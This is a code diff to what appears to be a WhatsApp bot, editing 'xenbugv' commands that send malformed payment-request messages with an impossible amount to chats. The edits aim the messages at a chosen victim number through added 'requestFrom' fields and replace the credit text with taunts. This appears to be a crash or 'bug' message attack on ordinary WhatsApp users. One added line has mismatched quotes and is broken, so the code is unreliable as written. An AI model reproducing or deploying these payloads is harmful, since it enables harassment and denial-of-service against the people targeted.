@@ -526,6 +526,7 @@ let buttons = [
 don = fs.readFileSync('./BotMedia/sewa.jpg')
  var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "requestPaymentMessage": {
+"requestFrom":'${nomore2}@s.whatsapp.net`,
 "currencyCodeIso4217": "IDR",
 "amount1000": "9999999999999999999999",
 "noteMessage": {
@@ -543,7 +544,7 @@ case 'xenbugv':
 "amount1000": "9999999999999999999999",
 "Message": {
 "extendedTextMessage": {
-"text": `Powered By Xin`,
+"text": `mwehee`,
 }
 }}}), { userJid: m.chat, quoted: m })
 XeonBotInc.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -551,6 +552,7 @@ XeonBotInc.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requ
 case 'xenbugv':
  var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "requestPaymentMessage": {
+"requestFrom":`${nomore2}`,
 "currencyCodeIso4217": "IDR",
 "amount1000": "9999999999999999999999",
 "Message": {
@@ -567,7 +569,7 @@ case 'xenbugv':
 "amount1000": "9999999999999999999999",
 "Message": {
 "extendedTextMessage": {
-"text": `Powered By Xin`,
+"text": `Kenji wass here bro`,
 }
 }}}), { userJid: m.chat, quoted: m })
 XeonBotInc.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
